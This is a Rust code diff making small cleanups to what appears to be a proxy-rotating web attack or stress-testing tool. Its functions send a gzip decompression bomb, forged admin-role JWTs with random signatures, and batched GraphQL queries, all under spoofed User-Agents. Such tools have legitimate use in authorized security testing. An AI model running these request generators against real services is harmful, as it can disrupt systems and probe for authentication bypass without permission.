@@ -818,8 +818,8 @@ pub(crate) async fn fetch_deflatebomb(c: Client, url: String, delay: u64, proxy_
     let mut encoder = GzEncoder::new(Vec::new(), Compression::best());
     // Write many zeros that will compress very efficiently
     let zeros = vec![0u8; 65536];
-    encoder.write_all(&zeros).unwrap();
-    let compressed = encoder.finish().unwrap();
+    encoder.write_all(&zeros)?;
+    let compressed = encoder.finish()?;
     if verbose { println!("[VERBOSE] fetch_deflatebomb: POST {} (proxy #{}) — deflate bomb: {} bytes -> {} bytes (decompresses to 64KB)", url, proxy_idx, compressed.len(), zeros.len()); }
     let resp = send_with_retry(c.post(&url).header("Content-Encoding", "gzip").header("Content-Type", "application/octet-stream").body(compressed).header("User-Agent", "Mozilla/5.0 (compatible; DeflateBomb/1.0)"), max_retries, "fetch_deflatebomb").await?;
     let status = resp.status().as_u16();
@@ -1160,8 +1160,8 @@ pub(crate) async fn fetch_jwtexplode(c: Client, url: String, delay: u64, proxy_i
         let mut rng = rand::rng();
         let header = "eyJhbGciOiJSUzI1NiIsImtpZCI6InNvbWVrZXl0ZXN0LTEyMy1hYmNkIiwidHlwIjoiSldUIn0";
         let payloads = [
-            &format!("eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIFVzZXIiLCJpYXQiOjE1MTYyMzkwMjIsInJvbGUiOiJhZG1pbiIsInBlcm1pc3Npb25zIjpbInJlYWQiLCJ3cml0ZSIsImRlbGV0ZSJdLCJzZXNzaW9uIjoie308fXx7fXx7fSJ9")[..],
-            &format!("eyJzdWIiOiJ0ZXN0QHRlc3QuY29tIiwiZW1haWwiOiJ0ZXN0QHRlc3QuY29tIiwibmFtZSI6IlRlc3QgVXNlciBSZWFsbHkgTG9uZyBOYW1lIiwiYWRtaW4iOnRydWUsIm9yZyI6ImV2aWwifQ")[..],
+            "eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkFkbWluIFVzZXIiLCJpYXQiOjE1MTYyMzkwMjIsInJvbGUiOiJhZG1pbiIsInBlcm1pc3Npb25zIjpbInJlYWQiLCJ3cml0ZSIsImRlbGV0ZSJdLCJzZXNzaW9uIjoie308fXx7fXx7fSJ9",
+            "eyJzdWIiOiJ0ZXN0QHRlc3QuY29tIiwiZW1haWwiOiJ0ZXN0QHRlc3QuY29tIiwibmFtZSI6IlRlc3QgVXNlciBSZWFsbHkgTG9uZyBOYW1lIiwiYWRtaW4iOnRydWUsIm9yZyI6ImV2aWwifQ",
         ];
         let sig = format!("{:032x}{:032x}{:032x}", rand::random::<u64>(), rand::random::<u64>(), rand::random::<u64>());
         format!("{}.{}.{}", header, payloads[rng.random_range(0..payloads.len())], sig)
@@ -1397,10 +1397,10 @@ pub(crate) async fn fetch_graphqlbatch(c: Client, url: String, delay: u64, proxy
     if delay > 0 { tokio::time::sleep(Duration::from_millis(delay)).await; }
     let mut body = String::from("[");
     for i in 0..50 {
-        if i > 0 { body.push_str(","); }
+        if i > 0 { body.push(','); }
         body.push_str(&format!(r#"{{"query":"query q{} {{ __typename }}","variables":{{}}}}"#, i));
     }
-    body.push_str("]");
+    body.push(']');
     if verbose { println!("[VERBOSE] fetch_graphqlbatch: POST {} (proxy #{}) — 50 batched queries, {} bytes", url, proxy_idx, body.len()); }
     let resp = send_with_retry(c.post(&url).header("Content-Type", "application/json").body(body).header("User-Agent", "Mozilla/5.0 (compatible; GraphqlBatch/1.0)"), max_retries, "fetch_graphqlbatch").await?;
     let status = resp.status().as_u16();
